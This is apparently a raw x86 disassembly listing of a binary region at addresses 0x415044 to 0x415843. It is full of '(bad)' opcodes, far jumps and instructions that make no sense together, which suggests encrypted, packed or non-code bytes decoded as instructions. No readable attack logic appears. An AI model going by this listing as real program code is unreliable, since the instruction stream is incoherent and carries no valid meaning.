  415044:	cmp    cl,BYTE PTR [esi+0x19]
  415047:	cmp    eax,0x969698ba
  41504c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41504d:	and    bl,BYTE PTR [ecx+0x1b0a4d2]
  415053:	fimul  DWORD PTR [edx-0x44]
  415056:	cld    
  415057:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  415059:	inc    esp
  41505a:	adc    esi,DWORD PTR [eax+eax*1+0x22]
  41505e:	test   eax,0x4fcf7251
  415063:	retf   
  415064:	ror    DWORD PTR [ecx-0x1d3103d5],0x98
  41506b:	jne    0x415059
  41506d:	nop
  41506e:	jns    0x4150b1
  415070:	shl    BYTE PTR [ebx-0x16],cl
  415073:	rcl    BYTE PTR [edi],0x27
  415076:	fwait
  415077:	push   esi
  415078:	bound  eax,QWORD PTR ds:0xdea1e55b
  41507e:	lds    edx,FWORD PTR [ecx-0x15]
  415081:	popa   
  415082:	fldenv [esi+0x13]
  415085:	jmp    0x415094
  415087:	and    eax,0x81c16ec9
  41508c:	adc    eax,0x258eb6cd
  415091:	add    dl,ch
  415093:	lock jmp 0x4ebd:0x250d
  41509a:	pusha  
  41509b:	add    eax,0x6d44b60d
  4150a0:	pop    esi
  4150a1:	aam    0x64
  4150a3:	dec    ebp
  4150a4:	or     eax,0x4e91c1a6
  4150a9:	aam    0xb6
  4150ab:	test   DWORD PTR [ecx],ebp
  4150ad:	push   ebp
  4150ae:	lock jg 0x415076
  4150b1:	mov    ebp,0x956400dc
  4150b6:	std    
  4150b7:	dec    eax
  4150b8:	pusha  
  4150b9:	(bad)  
  4150ba:	std    
  4150bb:	or     BYTE PTR [ebp+eax*8-0x4],dh
  4150bf:	lea    esi,[ebp-0x71ff6300]
  4150c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150c6:	xchg   ebp,eax
  4150c7:	fadd   st(3),st
  4150c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150ca:	(bad)  
  4150cb:	in     al,0x5
  4150cd:	add    BYTE PTR [ebx-0x3876ff24],bh
  4150d3:	cwde   
  4150d4:	or     al,0xc7
  4150d6:	(bad)  
  4150d7:	cwde   
  4150d8:	adc    BYTE PTR [ecx],al
  4150da:	jnp    0x4150b8
  4150dc:	add    bh,al
  4150de:	aaa    
  4150df:	mov    ecx,0xdc8b0214
  4150e4:	add    al,ch
  4150e6:	pop    esp
  4150e7:	mov    bl,0x2
  4150e9:	add    BYTE PTR [eax],al
  4150eb:	pop    eax
  4150ec:	pop    eax
  4150ed:	ret    
  4150ee:	inc    esi
  4150ef:	(bad)  
  4150f0:	in     eax,dx
  4150f1:	sub    DWORD PTR [edi],0x4bfffee5
  4150f7:	pop    edi
  4150f8:	mov    al,bh
  4150fa:	dec    BYTE PTR [ebp-0x2]
  4150fd:	call   0x3f9e42
  415102:	(bad)  
  415103:	popf   
  415104:	jne    0x415111
  415106:	mov    esi,0xdcfdf960
  41510b:	dec    ebp
  41510c:	jmp    0xfe8f26fe
  415111:	leave  
  415112:	enter  0xed59,0x1c
  415116:	js     0x415120
  415118:	mov    ch,BYTE PTR [edi+eiz*1-0x40]
  41511c:	push   esi
  41511d:	mov    esp,DWORD PTR [edi]
  41511f:	cwde   
  415120:	sub    BYTE PTR [edi+0x70],dl
  415123:	mov    bh,0x89
  415125:	stc    
  415126:	add    BYTE PTR [esi+0x21],bh
  415129:	and    eax,0x6706aa10
  41512e:	call   DWORD PTR [ecx]
  415130:	fsub   QWORD PTR [esi+0x1]
  415133:	cmc    
  415134:	pusha  
  415135:	xlat   BYTE PTR ds:[ebx]
  415136:	mov    DWORD PTR [edi],ecx
  415138:	cwde   
  415139:	sub    al,0xff
  41513b:	jmp    0x415128
  41513d:	jg     0x4150ff
  41513f:	int3   
  415140:	ss jmp 0x415143
  415143:	retf   
  415144:	fisttp DWORD PTR [ecx+0x493d6206]
  41514a:	and    al,0x56
  41514c:	jno    0x415176
  41514e:	pop    esp
  41514f:	les    eax,FWORD PTR [ecx-0x55e80300]
  415155:	cs std 
  415157:	xor    bl,BYTE PTR [edx+0x3d5dc07b]
  41515d:	add    BYTE PTR fs:[edx-0x3e],ah
  415161:	mov    DWORD PTR [esi+eax*2-0x52],eax
  415165:	adc    DWORD PTR [esi+edi*1-0x1e],0xffffff89
  41516a:	or     BYTE PTR [eax],dl
  41516c:	sbb    al,0xe5
  41516e:	imul   eax,DWORD PTR [esi-0x2e],0xc12e8f95
  415175:	add    BYTE PTR [eax],al
  415177:	fild   WORD PTR [eax-0x3f187cfb]
  41517d:	add    BYTE PTR [eax],al
  41517f:	add    DWORD PTR [ecx+eiz*8],0x1b
  415183:	jnp    0x415181
  415185:	loopne 0x4151a6
  415187:	lods   al,BYTE PTR ds:[esi]
  415188:	ror    BYTE PTR [ecx-0x3b79ff8c],1
  41518e:	shr    edx,1
  415190:	fld    DWORD PTR [ecx+eiz*8]
  415193:	and    ebp,ecx
  415195:	mov    ah,0xe8
  415197:	sbb    ebx,edi
  415199:	das    
  41519a:	or     al,0x48
  41519c:	js     0x41519e
  41519e:	cs std 
  4151a0:	outs   dx,DWORD PTR ds:[esi]
  4151a1:	inc    eax
  4151a2:	icebp  
  4151a3:	aas    
  4151a4:	bound  edi,QWORD PTR ds:0x9a3974c0
  4151aa:	add    BYTE PTR [edx-0x13],ch
  4151ad:	cmp    ebp,DWORD PTR [ebp-0x31f6e4cf]
  4151b3:	or     ah,BYTE PTR [eax-0x40]
  4151b6:	mov    eax,edi
  4151b8:	fucomip st,st(7)
  4151ba:	or     ebx,DWORD PTR [edi]
  4151bc:	fst    DWORD PTR [esp+ebx*8+0x3b]
  4151c0:	cmp    cl,bl
  4151c2:	and    cl,BYTE PTR [eax-0x8b53e69]
  4151c8:	arpl   cx,bx
  4151ca:	ins    DWORD PTR es:[edi],dx
  4151cb:	ret    
  4151cc:	ss leave 
  4151ce:	pop    esi
  4151cf:	inc    edi
  4151d0:	jle    0x4151c7
  4151d2:	pop    DWORD PTR [edx]
  4151d4:	fsubr  st,st(5)
  4151d6:	pop    ebx
  4151d7:	inc    ebx
  4151d8:	(bad)
  4151dd:	fstp   DWORD PTR [esi-0x3c]
  4151e0:	jp     0x415183
  4151e2:	mov    dl,0x5
  4151e4:	bound  ebx,QWORD PTR [edi]
  4151e6:	addr16 leave 
  4151e8:	and    dh,dl
  4151ea:	pop    ebp
  4151eb:	call   0x7fc97d3d
  4151f0:	add    dh,ch
  4151f2:	cld    
  4151f3:	stc    
  4151f4:	jle    0x4151c4
  4151f6:	std    
  4151f7:	cmc    
  4151f8:	jle    0x4151d0
  4151fa:	std    
  4151fb:	sar    DWORD PTR [esi+0x67],1
  4151fe:	fs push ds
  415200:	call   0x937c5a6a
  415205:	xchg   edx,eax
  415206:	add    DWORD PTR [edi+0x48],ebp
  415209:	jle    0x4151d8
  41520b:	cmp    DWORD PTR [edi+0x5a],edi
  41520e:	mov    dh,0x39
  415210:	cld    
  415211:	fcmovu st,st(6)
  415213:	sbb    al,0x3a
  415215:	pop    ds
  415216:	or     esi,edx
  415218:	jle    0x415276
  41521a:	or     al,0x0
  41521c:	add    eax,0xebc62d0f
  415221:	scas   eax,DWORD PTR es:[edi]
  415222:	mov    dh,0xba
  415224:	aaa    
  415225:	loope  0x4151bf
  415227:	jmp    0x4151b0
  415229:	push   esi
  41522a:	mov    dh,0x53
  41522c:	xchg   ebx,eax
  41522d:	out    dx,eax
  41522e:	sub    al,0x6
  415230:	hlt    
  415231:	fcmovu st,st(6)
  415233:	fwait
  415234:	xchg   edx,eax
  415235:	xor    dl,BYTE PTR [ecx]
  415237:	outs   dx,DWORD PTR ds:[esi]
  415238:	adc    BYTE PTR [esi-0xf],bh
  41523b:	add    BYTE PTR [edx+0x58],ah
  41523e:	or     al,0x67
  415240:	jmp    0xf59306d0
  415245:	jmp    0x91c:0xa6877698
  41524c:	xchg   edi,eax
  41524d:	xchg   BYTE PTR [eax+0x0],ah
  415250:	pop    esp
  415251:	and    bh,ch
  415253:	adc    BYTE PTR [eax+0x74b45800],bl
  415259:	in     eax,0x4c
  41525b:	mov    ah,0x51
  41525d:	test   eax,0x9f7698da
  415262:	add    al,0x2d
  415264:	and    eax,0x8dd7fd01
  415269:	sub    eax,0x4352058a
  41526e:	data16 mov ah,0x74
  415271:	in     eax,0x2c
  415273:	mov    ah,0x51
  415275:	loope  0x415261
  415277:	cdq    
  415278:	jbe    0x415256
  41527a:	lock sub eax,0x8accf525
  415280:	push   esp
  415281:	adc    al,0xf1
  415283:	sub    eax,0xa3bce525
  415288:	jmp    0xfcf825f9
  41528d:	bound  esp,QWORD PTR [ebp-0x5ac6cf03]
  415293:	loope  0x415290
  415295:	sbb    BYTE PTR [esi],bl
  415297:	bound  eax,QWORD PTR [eax]
  415299:	push   ss
  41529a:	icebp  
  41529b:	sub    eax,0xb654dd25
  4152a0:	push   ecx
  4152a1:	and    eax,0x297599db
  4152a6:	shr    BYTE PTR ds:0xda74f925,1
  4152ac:	dec    edi
  4152ad:	push   esi
  4152ae:	xor    DWORD PTR [ecx],esp
  4152b0:	pop    esp
  4152b1:	scas   eax,DWORD PTR es:[edi]
  4152b2:	xor    dl,BYTE PTR [edx]
  4152b4:	add    BYTE PTR [eax],0x8f
  4152b7:	(bad)
  4152bb:	retf   
  4152bc:	icebp  
  4152bd:	mov    esp,ebp
  4152bf:	cmp    dl,BYTE PTR [ecx+ebp*2+0x1]
  4152c3:	mov    ebx,0xe54cb6d8
  4152c8:	sbb    BYTE PTR [ecx],al
  4152ca:	push   esi
  4152cb:	in     al,dx
  4152cc:	and    eax,0xd8fb9e9d
  4152d1:	call   0x11967b7
  4152d6:	mov    ebx,DWORD PTR [ebx-0xf00ca4]
  4152dc:	sub    eax,DWORD PTR [ecx]
  4152de:	add    BYTE PTR [ebx-0x75],bh
  4152e1:	std    
  4152e2:	push   edi
  4152e3:	add    cl,cl
  4152e5:	cld    
  4152e6:	mov    esi,DWORD PTR [ebp-0xf]
  4152e9:	push   edx
  4152ea:	(bad)  
  4152eb:	cmp    bl,cl
  4152ed:	jg     0x4152af
  4152ef:	push   cs
  4152f0:	clc    
  4152f1:	mov    DWORD PTR [esi],eax
  4152f3:	push   es
  4152f4:	hlt    
  4152f5:	clc    
  4152f6:	push   ecx
  4152f7:	jl     0x4152cc
  4152f9:	(bad)  
  4152fa:	push   ebp
  4152fb:	adc    al,0xed
  4152fd:	adc    al,0x85
  4152ff:	sti    
  415300:	retf   
  415301:	push   eax
  415302:	mov    edx,0x4127c7
  415307:	ret    0x9e89
  41530a:	inc    eax
  41530b:	dec    ebx
  41530c:	push   eax
  41530d:	mov    ds:0x89d83bbf,eax
  415312:	clc    
  415313:	mov    esi,0x9632754a
  415318:	sbb    al,0xfd
  41531a:	push   eax
  41531b:	xchg   BYTE PTR [ecx+ebx*4-0x2],bl
  41531f:	add    BYTE PTR [edx+ecx*2+0xd3e8d51],dl
  415326:	push   ecx
  415327:	call   FWORD PTR [esi]
  415329:	pusha  
  41532a:	mov    dl,dh
  41532c:	jo     0x4152c8
  41532e:	mov    BYTE PTR [ebp+0x62],0x52
  415332:	dec    ecx
  415333:	add    BYTE PTR [edx-0x3e],ah
  415336:	leave  
  415337:	cmp    edx,0x1b
  41533a:	xchg   edx,eax
  41533b:	std    
  41533c:	jp     0x4152ff
  41533e:	add    BYTE PTR [eax],al
  415340:	mov    edx,0xc5fd8bc8
  415345:	or     dl,BYTE PTR ss:[ebp-0x43]
  415349:	jno    0x415343
  41534b:	mov    BYTE PTR [edi],bl
  41534d:	cli    
  41534e:	xor    al,0x89
  415350:	pop    edx
  415351:	retf   
  415352:	das    
  415353:	or     cl,bl
  415355:	mov    ebx,0xaa32fd3a
  41535a:	cwde   
  41535b:	jo     0x4153d2
  41535d:	ret    0x3c00
  415360:	push   cx
  415362:	jge    0x4153af
  415364:	xchg   BYTE PTR [esi-0x3b650a40],al
  41536a:	xchg   BYTE PTR [eax],al
  41536c:	(bad)  
  41536e:	add    DWORD PTR [ebp-0x6e5666e],esi
  415374:	mov    gs:0x802b5e31,al
  41537a:	jg     0x415368
  41537c:	loop   0x41533d
  41537e:	add    BYTE PTR [eax],al
  415380:	mov    cl,0xd5
  415382:	ss push ebp
  415384:	add    bl,bl
  415386:	aam    0xe8
  415388:	pop    ss
  415389:	stc    
  41538a:	sar    bh,0xff
  41538d:	(bad)  
  41538e:	out    dx,eax
  41538f:	jnp    0x41531d
  415391:	xchg   BYTE PTR [eax+eax*1],dh
  415394:	add    BYTE PTR [edx-0xf],ah
  415397:	xchg   ecx,eax
  415398:	mov    ah,0x46
  41539a:	cmp    al,0x5
  41539c:	add    BYTE PTR [edx+0x27],ah
  41539f:	xchg   esi,eax
  4153a0:	push   esi
  4153a1:	fld    st(2)
  4153a3:	xchg   ecx,eax
  4153a4:	push   eax
  4153a5:	outs   dx,BYTE PTR ds:[esi]
  4153a6:	outs   dx,DWORD PTR ds:[esi]
  4153a7:	xchg   ecx,eax
  4153a8:	and    DWORD PTR [edx],0xffffffda
  4153ab:	fld    QWORD PTR [edi]
  4153ad:	jmp    0x415371
  4153af:	dec    edi
  4153b0:	hlt    
  4153b1:	xchg   esi,eax
  4153b2:	aas    
  4153b3:	push   ebx
  4153b4:	jle    0x415384
  4153b6:	std    
  4153b7:	jno    0x4153bc
  4153b9:	(bad)  
  4153ba:	fdecstp 
  4153bc:	mov    edx,0x5eeedca
  4153c1:	bound  ebx,QWORD PTR [esi+0x42]
  4153c4:	jl     0x41541a
  4153c6:	push   es
  4153c7:	pop    ebp
  4153c8:	xchg   DWORD PTR [esi+0x6203e94d],eax
  4153ce:	or     DWORD PTR [ebx],ebx
  4153d0:	push   edi
  4153d1:	xchg   BYTE PTR [ecx+0xb6203e7],al
  4153d7:	or     esi,DWORD PTR [edx]
  4153d9:	jbe    0x415437
  4153db:	sub    dl,BYTE PTR [edi]
  4153dd:	pop    esi
  4153de:	pop    esi
  4153df:	sbb    ebx,DWORD PTR [ebx+esi*2-0x266f7ff6]
  4153e6:	dec    ebp
  4153e7:	(bad)  
  4153e8:	imul   eax,DWORD PTR [eax],0x7d
  4153eb:	mov    dl,0xea
  4153ed:	rcr    BYTE PTR [ecx+eax*8-0x269c0519],cl
  4153f4:	pop    esi
  4153f5:	lods   al,BYTE PTR ds:[esi]
  4153f6:	fninit 
  4153f8:	inc    ecx
  4153f9:	add    al,0x5d
  4153fb:	mov    dl,0xea
  4153fd:	sbb    dh,0xfc
  415400:	push   ebp
  415401:	add    ah,BYTE PTR [edx-0x27]
  415404:	sbb    DWORD PTR [edi+0x37dfd0e],ecx
  41540a:	(bad)  
  41540b:	fnstcw WORD PTR [ebx]
  41540d:	(bad)  
  41540e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41540f:	int    0x64
  415411:	les    esi,FWORD PTR [ecx+0x271a3ac6]
  415417:	fs jbe 0x415402
  41541a:	cmc    
  41541b:	(bad)  
  41541c:	jmp    0x92e1a724
  415421:	mov    dl,0x58
  415423:	xlat   BYTE PTR ds:[ebx]
  415424:	add    cl,ch
  415426:	mov    BYTE PTR [ecx+0x1ce2df88],dh
  41542c:	and    eax,0xb5b431f9
  415431:	add    eax,0xe900d872
  415436:	das    
  415437:	mov    ah,0x52
  415439:	stc    
  41543a:	pop    eax
  41543b:	and    eax,0x87b0d925
  415440:	xchg   BYTE PTR [ecx],ch
  415442:	dec    ecx
  415443:	fisttp DWORD PTR [ebx]
  415445:	lods   al,BYTE PTR ds:[esi]
  415446:	or     ebx,DWORD PTR [edx+0x4d]
  415449:	add    eax,0xcd4d5eb6
  41544e:	add    BYTE PTR [ebp-0x45aa03de],ch
  415454:	push   ecx
  415455:	add    cl,ch
  415457:	popa   
  415458:	or     edi,esp
  41545a:	mov    ecx,0xcd4d6091
  41545f:	(bad)  
  415460:	call   0xe3e7b933
  415465:	inc    ebp
  415466:	and    eax,DWORD PTR [edi]
  415468:	and    eax,0xce2d525
  41546d:	and    eax,0x1622715
  415472:	jmp    0x41eb15d8
  415477:	aad    0xb3
  415479:	mov    ?,WORD PTR ds:0x63b9d54a
  41547f:	popa   
  415480:	fld    DWORD PTR [eax]
  415482:	sar    DWORD PTR [ebx-0x374903bf],1
  415488:	gs and eax,0xd96081
  41548e:	pusha  
  41548f:	sub    DWORD PTR [edi+0x41],ecx
  415492:	jmp    0xa8ca0371
  415497:	and    al,0x1c
  415499:	les    edi,FWORD PTR [ecx]
  41549b:	cdq    
  41549c:	jo     0x415424
  41549e:	add    al,al
  4154a0:	scas   eax,DWORD PTR es:[edi]
  4154a1:	aas    
  4154a2:	ret    
  4154a3:	js     0x415485
  4154a5:	and    al,0x18
  4154a7:	sti    
  4154a8:	in     al,dx
  4154a9:	mov    ecx,eax
  4154ab:	sahf   
  4154ac:	call   0x222d78d5
  4154b1:	mov    edi,0xc88c0050
  4154b6:	and    al,0x1c
  4154b8:	jbe    0x415533
  4154ba:	push   cs
  4154bb:	inc    ebp
  4154bc:	jle    0x4154a3
  4154be:	std    
  4154bf:	je     0x415528
  4154c1:	mov    ecx,0x21674487
  4154c6:	push   ecx
  4154c7:	inc    ebp
  4154c9:	pop    edi
  4154ca:	adc    BYTE PTR [eax-0x67],dh
  4154cd:	sbb    al,0x1
  4154cf:	push   eax
  4154d0:	cmc    
  4154d1:	push   esp
  4154d2:	mov    WORD PTR [edx],fs
  4154d4:	mov    ecx,0x97c481dc
  4154d9:	xor    ecx,eax
  4154db:	call   0x3df630
  4154e0:	adc    BYTE PTR [ebx-0x17],dh
  4154e3:	aam    0x46
  4154e5:	aad    0x0
  4154e7:	mov    edi,DWORD PTR [esp+edx*2]
  4154ea:	enter  0x8ac5,0xdc
  4154ee:	pop    ebp
  4154ef:	pop    esi
  4154f0:	push   ds
  4154f1:	add    bh,BYTE PTR [esp+eax*8-0x5]
  4154f5:	fld    DWORD PTR [eax]
  4154f7:	add    BYTE PTR [ecx+0x1f80fcbd],bh
  4154fd:	leave  
  4154fe:	(bad)  
  4154ff:	dec    DWORD PTR [ebx-0x17]
  415502:	dec    edi
  415503:	push   esi
  415504:	je     0x415529
  415506:	jge    0x4154a6
  415508:	jnp    0x4154df
  41550a:	mov    bl,0x8c
  41550c:	lods   eax,DWORD PTR ds:[esi]
  41550d:	adc    eax,0x208fe801
  415512:	add    DWORD PTR [eax],eax
  415514:	mov    al,0x5d
  415516:	test   BYTE PTR [eax+eax*1+0x62],bh
  41551a:	sahf   
  41551b:	loopne 0x41549f
  41551d:	sbb    eax,0x604e848f
  415522:	ret    0x8900
  415525:	pop    ebp
  415526:	int3   
  415527:	push   DWORD PTR [eax]
  415529:	or     al,0xd0
  41552b:	xor    eax,0xe0967687
  415530:	cld    
  415531:	xchg   ebx,eax
  415532:	add    BYTE PTR [ebx-0x16caa240],0x1
  415539:	(bad)  
  41553b:	jns    0x415542
  41553d:	out    dx,eax
  41553e:	dec    ebp
  41553f:	in     al,0x1b
  415541:	xor    ecx,DWORD PTR [esi+edi*8-0xbae32ac]
  415548:	and    BYTE PTR [edx+0x600d83b6],0xc2
  41554f:	add    BYTE PTR [ecx-0x751361e2],cl
  415555:	push   ss
  415556:	xchg   esi,eax
  415557:	lock mov BYTE PTR [edx+0x74],bl
  41555b:	xor    ch,bh
  41555d:	xor    esp,DWORD PTR [esi+0x3d65c083]
  415563:	fwait
  415564:	dec    DWORD PTR [ebp-0x26032e3f]
  41556a:	jge    0x415550
  41556c:	pxor   mm0,QWORD PTR [ebp-0x1c]
  415570:	pop    ss
  415571:	jmp    0x6d91881f
  415576:	lock int3 
  415578:	and    BYTE PTR [edx+0xb083b6],0x63
  41557f:	rol    BYTE PTR [eax],0x37
  415582:	(bad)  
  415583:	fsub   st(4),st
  415585:	or     al,0xe6
  415587:	push   esi
  415588:	(bad)  
  415589:	jmp    DWORD PTR [edx+0x3b]
  41558c:	inc    esp
  41558d:	and    al,0x52
  41558f:	sbb    BYTE PTR ds:0xe9da35ff,al
  415595:	js     0x4155f1
  415597:	pop    esp
  415598:	jbe    0x415581
  41559a:	(bad)  
  41559c:	jmp    0x9a8305a4
  4155a1:	add    BYTE PTR [ecx-0x35],dl
  4155a4:	sbb    DWORD PTR [ebp-0x3c9b3a63],ecx
  4155aa:	mov    ss,ebp
  4155ac:	pop    esi
  4155ad:	pushf  
  4155ae:	or     ecx,ebx
  4155b0:	adc    bl,BYTE PTR [edx]
  4155b2:	neg    DWORD PTR [esi+edi*2-0x19]
  4155b6:	fstp   st(1)
  4155b8:	jmp    0x42e188c0
  4155bd:	int    0x64
  4155bf:	fucomi st,st(1)
  4155c1:	js     0x41558d
  4155c3:	bound  esi,QWORD PTR [esi-0x15bea219]
  4155c9:	add    ah,BYTE PTR [edx-0x27]
  4155cc:	pop    esi
  4155cd:	bnd call 0xb5c15c28
  4155d3:	scas   al,BYTE PTR es:[edi]
  4155d4:	jmp    0x51d1:0xe7a93a33
  4155db:	or     BYTE PTR [ebx],dl
  4155dd:	xor    DWORD PTR [esi+0x54],esi
  4155e0:	sub    dl,BYTE PTR [edi]
  4155e2:	add    BYTE PTR [esi+0x62],bl
  4155e5:	and    ebx,DWORD PTR [eax-0x736ff98d]
  4155eb:	fld    DWORD PTR [ebp-0x32]
  4155ee:	jae    0x41566d
  4155f0:	scas   al,BYTE PTR es:[edi]
  4155f1:	jmp    0x63fc:0xebc19cd0
  4155f8:	fldcw  WORD PTR [esi-0x54]
  4155fb:	fld    DWORD PTR ds:0x49153c0e
  415601:	jmp    0x4f22:0xe3c16203
  415608:	scas   al,BYTE PTR es:[edi]
  415609:	gs xchg edx,eax
  41560b:	into   
  41560c:	enter  0x4f00,0x2f
  415610:	in     al,dx
  415611:	je     0x4155f0
  415613:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415614:	in     eax,0x9a
  415616:	sub    DWORD PTR [esi+0x73],esp
  415619:	cmp    DWORD PTR [edi-0x62],edi
  41561c:	(bad)  
  41561e:	out    dx,al
  41561f:	scas   eax,DWORD PTR es:[edi]
  415620:	icebp  
  415621:	call   0x2472:0xc7605e29
  415628:	pop    edx
  415629:	fsubr  st,st(6)
  41562b:	mov    ds:0x24625198,al
  415630:	pop    edx
  415631:	out    dx,al
  415632:	fisub  WORD PTR [edx+0x6ab8519a]
  415638:	adc    eax,0x731b525
  41563d:	cld    
  41563e:	cld    
  41563f:	jno    0x41560c
  415641:	inc    eax
  415642:	jmp    0xd86b8d8
  415647:	add    BYTE PTR [esi-0x412116e3],ch
  41564d:	xlat   BYTE PTR ds:[ebx]
  41564e:	add    BYTE PTR [edx-0x5e],ch
  415651:	rol    BYTE PTR [edi-0x1656cae4],1
  415657:	mov    gs,ebp
  415659:	lods   eax,DWORD PTR ds:[esi]
  41565a:	cld    
  41565b:	jb     0x415642
  41565d:	shl    BYTE PTR [ecx+0x2d],0x67
  415661:	fld    DWORD PTR [edi+0x2fc5b5a5]
  415667:	xor    ch,ah
  415669:	scas   al,BYTE PTR es:[edi]
  41566a:	cld    
  41566b:	out    dx,al
  41566c:	inc    ebp
  41566d:	outs   dx,BYTE PTR ds:[esi]
  41566e:	mov    ch,BYTE PTR [ebp-0x14573a63]
  415674:	repnz lea edi,gs:0x80b9f982
  41567c:	popa   
  41567d:	fld    DWORD PTR [eax]
  41567f:	rol    ebx,0x33
  415682:	cld    
  415683:	into   
  415684:	aam    0x5
  415686:	and    eax,0x45322b00
  41568b:	and    al,0x2f
  41568d:	jmp    0x3f8a4cfa
  415692:	punpckhbw mm7,mm3
  415695:	rcl    DWORD PTR [ebx+0x24a5312],cl
  41569b:	sahf   
  41569c:	sub    ecx,edx
  41569e:	jecxz  0x4156a3
  4156a0:	xchg   esi,eax
  4156a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156a2:	lock or BYTE PTR fs:[ecx+0xf],al
  4156a7:	lea    edx,[edi-0x47]
  4156aa:	cmp    al,ch
  4156ac:	add    dl,al
  4156ae:	push   esp
  4156af:	(bad)  
  4156b0:	inc    DWORD PTR [eax-0x5ce7db14]
  4156b6:	lods   al,BYTE PTR ds:[esi]
  4156b7:	jo     0x4156f6
  4156b9:	jbe    0x4156b7
  4156bb:	and    al,0x30
  4156bd:	ret    0x140
  4156c0:	add    bl,cl
  4156c2:	push   eax
  4156c3:	pusha  
  4156c4:	data16 and al,0x5f
  4156c7:	mov    dl,BYTE PTR [edi+ebx*2-0x5b]
  4156cb:	xchg   DWORD PTR [edi+ebx*2-0x57],eax
  4156cf:	dec    esp
  4156d0:	push   0x13c2d37d
  4156d5:	mov    ds:0xa8c50248,eax
  4156da:	shr    bh,1
  4156dc:	add    esi,DWORD PTR [ecx-0x5d]
  4156df:	fs jmp 0x6853c46d
  4156e5:	jnp    0x4156ba
  4156e7:	les    edx,FWORD PTR [ebx]
  4156e9:	push   ss
  4156ea:	in     al,0x24
  4156ec:	dec    eax
  4156ed:	jae    0x41572f
  4156ef:	std    
  4156f0:	push   DWORD PTR [esi+ebp*1+0x45]
  4156f4:	and    al,0x93
  4156f6:	adc    BYTE PTR [ecx],cl
  4156f8:	je     0x41573c
  4156fa:	and    al,0x55
  4156fc:	and    al,0x47
  4156fe:	and    BYTE PTR [esi+0xc26200],dl
  415704:	call   0xfdcb6b87
  415709:	fxch   st(5)
  41570b:	loopne 0x41571c
  41570d:	xlat   BYTE PTR ds:[ebx]
  41570e:	cmc    
  41570f:	loopne 0x415724
  415711:	add    BYTE PTR [edx-0x77fe70e6],dl
  415717:	xchg   BYTE PTR [eax],bl
  415719:	lock popa 
  41571b:	mov    esp,ebp
  41571d:	addr16 das 
  41571f:	mov    edi,0x598a13da
  415724:	push   es
  415725:	sub    ebp,DWORD PTR [esi-0x26]
  415728:	xchg   esp,eax
  415729:	add    DWORD PTR [edx],edi
  41572b:	mov    ?,WORD PTR [ebx+0x4c]
  41572e:	ds (bad) 
  415730:	pushf  
  415731:	push   ebp
  415732:	(bad)  
  415733:	and    cl,BYTE PTR [edx-0x13699177]
  415739:	mov    BYTE PTR [esi-0x26b00b22],ah
  41573f:	test   eax,0x376a4f89
  415744:	inc    ecx
  415745:	and    al,0x76
  415747:	or     eax,0x27722431
  41574c:	std    
  41574d:	push   ecx
  41574e:	xor    ch,bl
  415750:	das    
  415751:	adc    al,0xe7
  415753:	add    edx,edi
  415755:	sbb    DWORD PTR [edx-0x4],0xffffff89
  415759:	std    
  41575a:	fnstenv [ebp-0x24]
  41575d:	pop    ds
  41575e:	fnstenv [ebp-0x24]
  415761:	sbb    esi,DWORD PTR [edx]
  415763:	aaa    
  415764:	cmc    
  415765:	cld    
  415766:	xor    BYTE PTR [edx-0x2ccafa83],bh
  41576c:	xor    al,0x8
  41576e:	enter  0x535,0x0
  415772:	bound  edx,QWORD PTR [ecx+0x7d]
  415775:	into   
  415776:	add    BYTE PTR [edx+0x6dfd923e],cl
  41577c:	fadd   DWORD PTR [edx+0x2a]
  41577f:	or     DWORD PTR [eax],edx
  415781:	imul   edi,DWORD PTR [edi+0x3e9d7de],0x975f0523
  41578b:	int    0xbd
  41578d:	jbe    0x415792
  41578f:	(bad)  
  415790:	fst    DWORD PTR [ebx]
  415792:	xor    ebx,ebp
  415794:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415795:	pop    edi
  415796:	mov    ch,bl
  415798:	sbb    al,0xe2
  41579a:	jbe    0x41572d
  41579c:	xchg   ebp,eax
  41579d:	xchg   edx,eax
  41579e:	jns    0x415761
  4157a0:	stos   BYTE PTR es:[edi],al
  4157a1:	fwait
  4157a2:	jbe    0x415745
  4157a4:	xchg   ebp,eax
  4157a5:	cmp    al,0x34
  4157a7:	jmp    0xfca6e00
  4157ac:	stos   DWORD PTR es:[edi],eax
  4157ad:	adc    ah,bl
  4157af:	xchg   ebp,eax
  4157b0:	rol    DWORD PTR [edi+0x66d963e9],0xbf
  4157b7:	push   edx
  4157b8:	push   esp
  4157b9:	stos   BYTE PTR es:[edi],al
  4157ba:	or     DWORD PTR [eax+0x5e],eax
  4157bd:	jmp    0x415835
  4157bf:	cdq    
  4157c0:	loope  0x41577a
  4157c2:	jbe    0x4157ad
  4157c4:	and    eax,0x8d78853
  4157c9:	mov    bl,0x88
  4157cb:	repnz inc ebp
  4157cd:	jmp    0x680e:0x2a546203
  4157d4:	pop    esi
  4157d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157d6:	sti    
  4157d7:	mov    ebp,0x3398f
  4157dc:	bound  edi,QWORD PTR [esi+0xae5d4e8]
  4157e2:	mov    esp,0xe9d5a0ba
  4157e7:	add    BYTE PTR [esi+0x6203ea71],0x6
  4157ee:	popf   
  4157ef:	xor    ebx,ebx
  4157f1:	gs (bad) 
  4157f3:	mov    bh,0x62
  4157f5:	fld    DWORD PTR [eax]
  4157f7:	jmp    0x8195d9f2
  4157fc:	neg    eax
  4157fe:	add    cl,ch
  415800:	call   0xdff0e08c
  415805:	or     eax,0x2df61525
  41580a:	cld    
  41580b:	into   
  41580c:	in     eax,0x5f
  41580e:	stc    
  41580f:	push   ecx
  415810:	rcr    ecx,cl
  415812:	add    cl,ch
  415814:	mov    eax,0xb7a78888
  415819:	sub    eax,0x31ce0125
  41581e:	cld    
  41581f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415820:	fstp   QWORD PTR [edi-0x30]
  415823:	adc    DWORD PTR [ecx+ebx*8-0x64671700],ecx
  41582a:	mov    ah,BYTE PTR ds:0x1ee8c202
  415830:	(bad)  [ebx+0x40b172fc]
  415836:	nop
  415837:	jmp    0x9fc9319d
  41583c:	imul   eax,ecx,0xdc00aee9
  415842:	stos   DWORD PTR es:[edi],eax
  415843:	cld    
